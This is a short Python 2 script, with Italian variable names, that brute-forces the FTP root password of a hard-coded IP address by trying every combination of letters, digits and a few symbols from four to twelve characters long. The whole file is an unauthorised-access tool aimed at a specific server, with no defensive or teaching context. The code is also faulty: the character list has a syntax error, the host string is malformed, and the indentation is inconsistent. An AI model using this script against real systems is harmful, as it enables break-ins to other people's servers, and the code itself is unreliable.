import ftplib

listaCaratteri = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', ".", ",", "-", "_", "@", "+", ,"0" ,"1", "2", "3", "4", "5", "6", "7", "8", "9"]
 
def testaPassword(password):
    try:
    	ftp = ftplib.FTP("ftp://218.38.58.188", "root", password)
    	print "Password trovata:", password
    	ftp.quit()
	exit() 
    except:
    	return
   
for c1 in listaCaratteri:
    for c2 in listaCaratteri:
        for c3 in listaCaratteri:
            for c4 in listaCaratteri:
                psw = c1+c2+c3+c4   
                testaPassword(psw)
                for c5 in listaCaratteri:
                    psw = c1+c2+c3+c4+c5    
                    testaPassword(psw)
                    for c6 in listaCaratteri:
                        psw = c1+c2+c3+c4+c5+c6
                        testaPassword(psw)
                        for c7 in listaCaratteri:
                            psw = c1+c2+c3+c4+c5+c6+c7
                            testaPassword(psw)
                            for c8 in listaCaratteri:
                                psw = c1+c2+c3+c4+c5+c6+c7+c8
                                testaPassword(psw)
                                for c9 in listaCaratteri:
                                    psw = c1+c2+c3+c4+c5+c6+c7+c8+c9
                                    testaPassword(psw)
                                    for c10 in listaCaratteri:
                                        psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10
                                        testaPassword(psw)
                                        for c11 in listaCaratteri:
                                            psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11
                                            testaPassword(psw)
                                            for c12 in listaCaratteri:
                                                psw = c1+c2+c3+c4+c5+c6+c7+c8+c9+c10+c11+c12
                                                testaPassword(psw)

